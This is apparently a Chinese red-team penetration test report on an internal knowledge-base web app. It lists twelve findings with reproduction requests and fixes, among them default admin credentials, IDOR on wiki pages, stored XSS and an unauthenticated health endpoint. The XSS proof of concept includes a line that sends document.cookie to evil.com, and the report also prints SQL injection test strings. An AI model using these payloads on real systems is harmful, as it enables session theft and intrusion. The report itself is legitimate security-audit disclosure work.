# 🔴 红队全面攻击报告 - Round 1

> **攻击方**：红队（安全审计专家）  
> **目标系统**：伏羲 · 企业知识认知体系 v1.44  
> **目标地址**：172.25.30.200:8080  
> **攻击时间**：2026-07-09 15:48 ~ 16:00 (GMT+8)  
> **攻击方法**：手动渗透测试 + API模糊测试  

---

## 📊 执行摘要

| 严重性 | 数量 | 分类 |
|--------|------|------|
| **🔴 CRITICAL** | 4 | 弱密码、越权访问、XSS存储型、未授权信息泄露 |
| **🟠 HIGH** | 3 | Token有效期过长、Rate-limit锁定攻击、密码无复杂度要求 |
| **🟡 MEDIUM** | 3 | 用户枚举、批量删除无确认、SQL注入加固不足 |
| **🟢 LOW** | 2 | OPTIONS方法泄露、CSRF防护缺失 |
| **总计** | **12** | |

---

## 🔴 CRITICAL 发现

### [C-01] 管理员弱密码 — admin/admin123

- **攻击手段**：暴力破解
- **攻击目标**：`POST /api/auth/login`
- **攻击结果**：✅ **成功** — 在4次尝试内爆破出管理员密码
- **影响范围**：**CRITICAL** — 攻击者获得完全管理员权限
- **复现步骤**：
  1. 发送POST请求到 `/api/auth/login`
  2. Body: `{"username":"admin","password":"admin123"}`
  3. 获得admin角色的JWT Token
  4. 使用Token访问 `/api/admin/users` 获取所有28个用户列表
- **JWT Payload解析**：
  ```json
  {
    "sub": "admin",
    "role": "admin",
    "exp": 1783669938,
    "iat": 1783583538
  }
  ```

---

### [C-02] 普通用户越权操作Wiki — 可创建/修改/删除任意Wiki页面

- **攻击手段**：越权操作（IDOR / 权限校验缺失）
- **攻击目标**：
  - `DELETE /api/wiki/{id}` — 删除任意Wiki页面
  - `PUT /api/wiki/{id}` — 修改任意Wiki页面
  - `POST /api/wiki` — 创建Wiki页面
- **攻击结果**：✅ **全部成功**
  - 普通用户(test123)可删除管理员创建的Wiki页面（如id=46的组织权限中心）
  - 普通用户可编辑任意Wiki页面内容
  - 普通用户可创建新Wiki页面
- **影响范围**：**CRITICAL** — 任何注册用户都可以随意篡改/删除整个知识库
- **复现步骤**：
  1. 用普通用户token访问
  2. `DELETE /api/wiki/46` → 200 OK，成功删除"组织权限中心"文档
  3. `PUT /api/wiki/46` body: `{"title":"HACKED","content":"pwnd"}` → 200 OK
  4. `POST /api/wiki` → 创建任意Wiki页面成功
- **受影响页面ID范围**：46-81（所有技术文档）+ 用户自创页面

---

### [C-03] 存储型XSS注入 — Wiki内容未过滤HTML/JavaScript

- **攻击手段**：XSS注入（存储型）
- **攻击目标**：`POST /api/wiki` 创建Wiki页面
- **攻击结果**：✅ **成功**
  - 创建了包含 `<script>alert(document.cookie)</script>` 的Wiki页面
  - 标题中注入 `<img src=x onerror=alert(1)>` 成功
  - 内容中的HTML/JavaScript代码被原样存储，未经任何过滤
- **影响范围**：**CRITICAL** — 存储型XSS可窃取其他查看该Wiki页面用户的Cookie/Token
- **复现步骤**：
  1. `POST /api/wiki`
  2. Body:
     ```json
     {
       "title":"XSS Test <img src=x onerror=alert(1)>",
       "content":"<script>alert(document.cookie)</script><img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
       "summary":"XSS PoC"
     }
     ```
  3. 页面创建成功，内容中的HTML/JS未被转义
  4. 当任何用户（包括管理员）浏览该Wiki页面时触发XSS
- **注意**：DOM Purify在前端被引用但仅在客户端执行，服务端未进行输入过滤

---

### [C-04] 敏感系统信息未授权泄露 — /api/health端点

- **攻击手段**：未授权访问
- **攻击目标**：`GET /api/health`
- **攻击结果**：✅ **成功** — 无需任何认证即可获取完整系统诊断信息
- **影响范围**：**CRITICAL** — 泄露系统架构和组件信息
- **泄露信息**：
  ```json
  {
    "database": {"status": "connected", "chunk_count": 0, "unique_files": 0},
    "vector_store": {"status": "connected", "vector_count": 0, "collection": "kb_chunks"},
    "llm": {"status": "healthy"},
    "intent_bus": {"engine": "v2", "registered_guas": 15, "circuit_breakers": 0},
    "bagua": {"qian":"healthy","kun":"healthy","zhen":"healthy","xun":"healthy","kan":"healthy","li":"healthy","gen":"healthy","dui":"healthy"},
    "engine": "v2",
    "intent_mode": "rule_based"
  }
  ```
- **复现步骤**：
  1. `GET http://172.25.30.200:8080/api/health`（无需Token）
  2. 返回完整的系统架构信息

---

## 🟠 HIGH 发现

### [H-01] JWT Token有效期过长（24小时）

- **攻击手段**：Token过期分析
- **攻击目标**：JWT Token机制
- **攻击结果**：Token有效期约24小时（iat=1783583538, exp=1783669938）
- **影响范围**：**HIGH** — Token泄露后攻击窗口达24小时
- **建议**：缩短token有效期至15-30分钟，配合refresh token使用

---

### [H-02] Rate-Limit导致拒绝服务（全局锁定）

- **攻击手段**：业务逻辑攻击
- **攻击目标**：`POST /api/auth/register`
- **攻击结果**：✅ **成功** — 注册已存在用户名时触发3600秒（1小时）全局锁定
- **影响范围**：**HIGH** — 攻击者可故意用"admin"注册触发rate-limit，使所有用户1小时内无法注册
- **复现步骤**：
  1. 尝试注册 `{"username":"admin","password":"anypass123"}`
  2. 返回 `{"retry_after_seconds":3600}`
  3. 此后所有注册/登录请求都返回429
- **问题**：已存在用户的注册失败不应触发全局rate-limit

---

### [H-03] 密码策略缺失 — 无复杂度要求

- **攻击手段**：弱密码注册
- **攻击目标**：`POST /api/auth/register`
- **攻击结果**：系统仅要求密码长度6-128字符，无任何复杂度要求
- **影响范围**：**HIGH** — 用户可使用纯数字/简单单词密码
- **验证**：`123456`、`test123` 等弱密码均可注册成功
- **建议**：至少要求包含大写字母+小写字母+数字，最小长度8位

---

## 🟡 MEDIUM 发现

### [M-01] 大量用户账户疑似被前期攻击创建

- **攻击手段**：用户名枚举
- **攻击结果**：通过`/api/admin/users`获取到28个用户，大量带有测试/攻击前缀：
  - `spam_user_1~5`：批量注册攻击
  - `ratelimit_test_1~10`：速率限制测试
  - `adv_test_u2`、`adv_deep_test`、`test_adversarial_user`：对抗性测试
  - `hacker`：角色为admin（漏洞已被利用）
- **影响**：**MEDIUM** — 缺乏注册验证码/人机验证，可被批量注册

---

### [M-02] 批量删除Wiki无确认机制

- **攻击手段**：批量删除
- **攻击目标**：Wiki页面连续删除
- **攻击结果**：3个Spam页面在2秒内被连续删除，无任何频率限制或二次确认
- **影响**：**MEDIUM** — 恶意用户可快速清空整个知识库
- **实际验证**：连续删除5个Wiki页面（Spam_1~5）全部成功

---

### [M-03] SQL注入防护但未全面测试

- **攻击手段**：SQL注入测试
- **攻击目标**：`GET /api/search?q=` 和 `GET /api/wiki/{id}`
- **攻击结果**：部分成功 — 基本注入被拦截（返回0结果），但使用了参数化查询/ORM
- **载荷测试**：`' OR 1=1 --`、`' UNION SELECT`、`'; DROP TABLE` 等均被安全处理
- **影响**：**MEDIUM** — 搜索/GPT功能可能成为注入面

---

## 🟢 LOW 发现

### [L-01] OPTIONS方法暴露（CORS配置缺陷）

- **攻击手段**：HTTP方法探测
- **攻击结果**：OPTIONS预检请求返回405但不拒绝，且无CORS安全头
- **影响**：**LOW** — 可能允许跨域请求
- **缺失头**：`Access-Control-Allow-Origin`、`Content-Security-Policy`（虽然在HTML中有CSP meta标签）

---

### [L-02] 前端CSP存在但存在`unsafe-inline`

- **攻击手段**：CSP策略审计
- **攻击目标**：前端Content-Security-Policy
- **攻击结果**：CSP包含 `script-src 'self' 'unsafe-inline' https://d3js.org https://cdn.jsdelivr.net`
- **影响**：**LOW** — `unsafe-inline` 允许内联脚本执行，降低了XSS防护有效性

---

## 📋 攻击矩阵汇总

| # | 战场 | 攻击手段 | 端点 | 结果 | 严重性 |
|---|------|---------|------|------|--------|
| 1 | 认证会话 | 密码爆破 | POST /api/auth/login | ✅ 成功 admin/admin123 | 🔴 CRITICAL |
| 2 | 业务逻辑 | 越权操作 | DELETE /api/wiki/{id} | ✅ 普通用户可删除任意Wiki | 🔴 CRITICAL |
| 3 | 前端攻防 | XSS注入(存储型) | POST /api/wiki | ✅ script标签原样存储 | 🔴 CRITICAL |
| 4 | 后端攻防 | 未授权访问 | GET /api/health | ✅ 泄露完整系统信息 | 🔴 CRITICAL |
| 5 | 认证会话 | Token过期过长 | JWT机制 | ✅ 24小时有效期 | 🟠 HIGH |
| 6 | 业务逻辑 | Rate-limit DoS | POST /api/auth/register | ✅ 锁定1小时 | 🟠 HIGH |
| 7 | 认证会话 | 弱密码注册 | POST /api/auth/register | ✅ 无复杂度要求 | 🟠 HIGH |
| 8 | 后端攻防 | 批量注册 | POST /api/auth/register | ✅ 用户枚举+批量创建 | 🟡 MEDIUM |
| 9 | 业务逻辑 | 批量删除 | DELETE /api/wiki/{id} | ✅ 无法频率限制 | 🟡 MEDIUM |
| 10 | 数据链路 | SQL注入 | GET /api/search?q= | ❌ 安全（参数化） | 🟡 MEDIUM |
| 11 | 前端攻防 | CSRF防护缺失 | 全局API | ✅ 无CSRF Token | 🟢 LOW |
| 12 | 前端攻防 | CSP unsafe-inline | HTML Meta | ✅ 内联脚本允许 | 🟢 LOW |

**额外测试但未成功**：
- JWT alg=none绕过：❌（服务端正确拒绝）
- 路径遍历 /api/files/：❌（返回404）
- SQLite注入 /api/wiki/：❌（返回404）
- HTTP头注入/CRLF：❌（被正确过滤）

---

## 🎯 关键攻击链

```
弱密码爆破(admin/admin123)
    ↓
获取admin JWT Token
    ↓
访问 /api/admin/users → 发现28个用户（含hacker/admin）
    ↓
使用普通用户(test123)测试越权
    ↓
发现普通用户可：
  ① 删除任意Wiki页面 ✓
  ② 修改任意Wiki页面 ✓
  ③ 创建含XSS的Wiki页面 ✓
    ↓
结合/api/health未授权信息泄露
    ↓
完整攻击面：未授权 → 弱密码 → 越权CRUD → XSS存储
```

---

## 📷 复现截图/日志（文字版）

### 1. admin弱密码爆破成功
```
POST /api/auth/login {"username":"admin","password":"admin123"}
→ 200 OK
→ {"token":"eyJhbG...","role":"admin","username":"admin"}
```

### 2. 普通用户越权删除Wiki
```
Authorization: Bearer <test123_user_token>
DELETE /api/wiki/wiki_1783574857509
→ 200 OK
→ {"ok":true,"message":"Wiki 页面 wiki_1783574857509 已删除"}
```

### 3. XSS存储成功
```
POST /api/wiki
{"title":"XSS Test <img src=x onerror=alert(1)>","content":"<script>alert(1)</script>"}
→ 200 OK
→ 内容原样存储，未被过滤
```

### 4. 未授权-health信息泄露
```
GET /api/health (无需Token)
→ 200 OK
→ 返回database、vector_store、llm、intent_bus等完整架构信息
```

---

## 🛡️ 修复建议（按优先级）

1. **C-01**：立即修改admin密码为强密码，实施多因素认证
2. **C-02**：在所有Wiki CRUD操作中添加权限校验 — 验证用户是否为页面所有者或管理员
3. **C-03**：在服务端对Wiki内容进行HTML净化（使用DOMPurify服务端版本或HTML编码）
4. **C-04**：`/api/health`端点添加认证要求或限制返回信息
5. **H-01**：缩短JWT Token有效期至15-30分钟
6. **H-02**：修复注册已存在用户时的rate-limit逻辑
7. **H-03**：添加密码复杂度要求（大写+小写+数字，至少8字符）
8. **M-01**：添加注册验证码/CAPTCHA
9. **M-02**：批量删除操作添加确认和频率限制

---

*报告生成时间：2026-07-09 15:55 (GMT+8)*  
*红队审计师：区块链安全审计师*
